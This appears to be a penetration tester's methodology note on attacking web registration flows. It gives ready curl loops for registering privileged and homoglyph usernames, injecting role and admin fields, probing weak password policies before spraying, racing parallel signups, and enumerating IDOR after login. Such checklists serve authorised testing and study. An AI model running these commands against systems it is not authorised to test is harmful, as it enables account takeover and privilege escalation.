
Attacks against user registration / sign-up flows. Entry from [[Web Attack Checksheet]] sub-block 1.7 on register form observation.

Sister files: [[Username Enumeration]] (register-form enumeration signal), [[Credential Attacks]] (creds recovered may feed login), [[Login Bypass Techniques]] (bypass may include register-then-login).

Ordering: privileged username registration first (fast, high P if app naively trusts registration input); weak password policy check (reveals what's allowed, sometimes lets you register admin-adjacent accounts); parameter tampering during registration (role/permission escalation); account creation race conditions; post-registration surface enumeration (authenticated re-walk).

---

## 1. Register with privileged usernames

Some apps naively allow registration with system usernames (admin, root, administrator), and the newly-created account inherits privileges — or overwrites the existing privileged account.

**Attempt registration with privileged names:**

```bash
for u in admin administrator root superuser sysadmin operator manager guest support; do
  echo -n "register $u → "
  curl -sX POST -d "username=$u&email=$u@attacker.tld&password=Attacker1234&cpassword=Attacker1234" http://<host>:<port>/<signup_path> -o /dev/null -w '[%{http_code}]\n'
done
```

Watch for 200/302 responses without the expected "username taken" error (unless taken response is your goal — it's also useful, feeds [[Username Enumeration]]).

Route:

- Registration accepted for privileged name → login with created creds via [[Credential Attacks]] Section 6 (post-success routing) using `<privileged_name>:Attacker1234`. Check if new account has elevated permissions on any admin surface.
- All privileged names rejected as taken → informational for [[Username Enumeration]] (these are valid usernames); 2

---

## 2. Register with username variants

Character-level variations that may bypass uniqueness checks while ending up interpreted as an existing user by downstream code (Unicode normalisation flaws, trailing whitespace, case handling).

**Attempt registration variants of `admin`:**

```bash
for u in "admin " " admin" "Admin" "ADMIN" "admın" "аdmin" "admin%00" "admin\t" "admin."; do
  echo -n "register [$u] → "
  curl -sX POST --data-urlencode "username=$u" --data-urlencode "email=x@attacker.tld" --data-urlencode "password=Attacker1234" --data-urlencode "cpassword=Attacker1234" http://<host>:<port>/<signup_path> -o /dev/null -w '[%{http_code}]\n'
done
```

Variants tested:

- `admin ` (trailing space)
- ` admin` (leading space)
- `Admin`, `ADMIN` (case variants)
- `admın` (Turkish dotless i, may collide with `admin` in some locales)
- `аdmin` (Cyrillic `а` — visually identical)
- `admin%00` (null byte truncation)
- `admin\t` (tab)
- `admin.` (trailing dot)

Route:

- Any variant registered → attempt login via [[Credential Attacks]] Section 6 with variant username; check if the app's downstream lookup resolves it as the real `admin` user
- All rejected → 3

---

## 3. Parameter tampering during registration

Extra parameters may be accepted and assign privileges the UI doesn't offer.

**Inspect the normal registration request via Burp.** Note the expected fields (typically `username`, `email`, `password`, `cpassword`).

**Try adding privilege-adjacent fields:**

```bash
curl -sX POST -d 'username=attacker&email=a@x.com&password=Attacker1234&cpassword=Attacker1234&role=admin&isAdmin=true&is_admin=1&admin=1&user_type=admin&privilege=admin&group=administrator&roleId=1' -i http://<host>:<port>/<signup_path>
```

**Try JSON body variant:**

```bash
curl -sX POST -H 'Content-Type: application/json' -d '{"username":"attacker","email":"a@x.com","password":"Attacker1234","cpassword":"Attacker1234","role":"admin","isAdmin":true}' -i http://<host>:<port>/<signup_path>
```

**Try nested object injection (JavaScript object prototype pollution vector):**

```bash
curl -sX POST -H 'Content-Type: application/json' -d '{"username":"attacker","email":"a@x.com","password":"Attacker1234","cpassword":"Attacker1234","permissions":{"admin":true}}' -i http://<host>:<port>/<signup_path>
```

Route:

- Registration accepted → login → check for elevated permissions via authenticated re-walk of admin-adjacent WAC sub-blocks
- All rejected → 4

---

## 4. Weak password policy exploitation

If app allows extremely weak passwords, common passwords work universally — every user account (including yours after registration) can be brute-forced from a tiny list.

**Test the minimum password policy.** Attempt registration with progressively weaker passwords:

```bash
for p in "a" "12" "123" "abc" "password" ""; do
  echo -n "register with password [$p] → "
  curl -sX POST --data-urlencode "username=weak_$RANDOM" --data-urlencode "email=x@x.com" --data-urlencode "password=$p" --data-urlencode "cpassword=$p" http://<host>:<port>/<signup_path> -o /dev/null -w '[%{http_code}]\n'
done
```

Route:

- Very weak passwords accepted → [[Credential Attacks]] Section 4 (password spray) EV increases dramatically; spray `password`, `12345`, common short strings against user list
- Reasonable policy enforced (rejects short/common) → note for later, 5

---

## 5. Account creation race conditions

Race conditions during registration may allow:

- Two accounts with same username (breaks uniqueness constraint)
- One user, multiple simultaneous session tokens
- Bypass rate limits on registration

**Test with parallel requests:**

```bash
for i in $(seq 1 20); do
  curl -sX POST -d "username=race_test&email=r$i@x.com&password=Attacker1234&cpassword=Attacker1234" http://<host>:<port>/<signup_path> &
done
wait
```

After completion, attempt to log in as `race_test`. Check if multiple accounts exist (some apps assign sequential IDs; check `?id=<n>` for `race_test` variants).

Route:

- Multiple accounts created for same username → downstream may confuse them; login to different variants and test data separation
- Single account created (correctly rate-limited or uniqueness-enforced) → 6

---

## 6. Post-registration surface enumeration

Successful registration yields an authenticated foothold — even if the account is unprivileged, authenticated surfaces may reveal:

- Admin API endpoints that check auth but not privilege
- IDOR opportunities on user-scoped URLs (`/dashboard?id=1`, `/profile/1`)
- Stored input surfaces (comments, profile, tickets) reachable only authenticated
- Registration-triggered emails to admin (if app notifies admin of new signups, may include admin's contact info)

**Register test account (if not already done above):**

```bash
curl -sX POST -c cookies.txt -d 'username=test_recon&email=x@x.com&password=Attacker1234&cpassword=Attacker1234' http://<host>:<port>/<signup_path>
curl -sX POST -c cookies.txt -b cookies.txt -d 'username=test_recon&password=Attacker1234' http://<host>:<port>/<login_path>
```

**Post-registration URL inspection.** After registration, note the URL the app redirects to. Common patterns leak user identifier:

- `/dashboard?id=<n>` → route to [[IDOR]] (id parameter surfaced)
- `/profile/<username>` → route to [[IDOR]] (path traversal for other users)
- `/welcome?token=<t>` → capture token, inspect for reuse potential

**Authenticated re-walk of WAC.** With `cookies.txt` (session cookie), re-walk [[Web Attack Checksheet]] sub-blocks 1.6-1.13 using `-b cookies.txt` on all curl commands. New authenticated surfaces often become visible:

- Admin panels that showed 302→login now show content
- API endpoints that returned 401 now return data
- Upload features previously hidden appear

Route:

- Post-registration IDOR opportunity → [[IDOR]] (contributes usernames to [[Username Enumeration]] `users_<host>.txt` via user-record enumeration)
- Authenticated re-walk reveals new attack surface → follow the WAC routing for that surface
- Nothing new revealed → 7

---

## 7. Post-success routing

On any successful outcome from Sections 1-6:

1. Log to `route_<ip>.txt`:

    `printf '[Registration Attacks] APPLIED: <outcome> on <host>:<port>\n' >> route_<ip>.txt`

2. Save any recovered creds to `creds_<host>.txt`:

    `echo '<user>:<pass>' >> creds_<host>.txt`

3. Route by outcome:

- Privileged account registered → [[Credential Attacks]] Section 6 (post-success routing) using the new privileged creds
- Weak-password policy confirmed → note for [[Credential Attacks]] Section 4 (password spray)
- Post-registration IDOR discovered → [[IDOR]]
- Authenticated foothold established → [[Credential Attacks]] Section 6 with new creds
- Admin surface reached with RCE-viable feature → [[File Upload]] or relevant WAC technique

---

## Exhaustion

Sections 1-6 all exhausted without foothold-relevant outcome:

- Test account was still created — usernames enumerated via registration attempts fed [[Username Enumeration]]
- Return to [[Web Attack Checksheet]] Step 1 walking (next sub-block)
